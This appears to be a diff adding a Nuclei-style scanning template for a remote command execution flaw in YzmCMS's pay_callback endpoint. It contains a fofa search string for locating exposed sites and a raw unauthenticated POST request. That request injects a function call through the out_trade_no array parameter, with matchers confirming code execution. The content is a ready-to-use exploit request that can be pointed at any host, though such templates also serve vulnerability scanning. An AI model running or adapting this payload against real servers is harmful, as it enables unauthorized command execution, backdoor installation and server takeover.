@@ -1,0 +1,37 @@
+id: YzmCMS-pay_callback-RCE
+
+info:
+  name: YzmCMS pay_callback 远程命令执行漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: app="yzmcms"
+    YzmCMS /pay/index/pay_callback.html接口存在远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140112191
+  tags: RCE
+  
+http:
+  - raw:
+      - |
+        POST /pay/index/pay_callback.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'phpinfo()'
+          - 'PHP Version'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
